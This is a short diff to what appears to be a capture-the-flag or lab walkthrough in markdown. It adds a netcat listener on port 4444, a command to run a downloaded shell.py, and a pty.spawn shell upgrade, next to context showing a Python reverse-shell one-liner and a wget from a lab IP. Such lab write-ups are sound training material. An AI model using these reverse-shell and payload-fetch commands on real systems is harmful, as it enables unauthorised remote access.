@@ -45,4 +45,12 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 wget 10.10.14.8/shell.py
 ```
+```
+nc -nlvp 4444
+python -c shell.py
+```
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
 ![image](https://user-images.githubusercontent.com/33616880/231084808-1b28d08b-1c89-46bd-9d76-3770e62233fc.png)
+![image](https://user-images.githubusercontent.com/33616880/231085786-4b06a14b-e3d7-4406-98b4-ab4f676953d9.png)
